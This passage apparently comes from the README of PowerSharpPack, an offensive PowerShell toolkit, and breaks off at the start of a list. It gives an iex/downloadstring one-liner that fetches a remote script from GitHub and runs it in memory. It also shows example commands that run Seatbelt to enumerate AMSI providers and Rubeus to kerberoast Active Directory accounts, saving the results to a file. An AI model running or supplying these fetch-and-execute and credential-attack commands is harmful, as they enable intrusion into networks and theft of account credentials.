Just load the main script with

`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')`

and choose the tool as switch parameter for example:

`PowerSharpPack -seatbelt -Command "AMSIProviders"`

[![alt text](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/images/Example.JPG)](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/images/Example.JPG)

If you want to pass multiple parameters to the binary you can just use quotation marks like:

`PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`

If you dont want to load all binaries for reasons you can use the per binary Powershell scripts located in the PowerSharpBinaries folder.

Projects which are also available as standalone powershell script: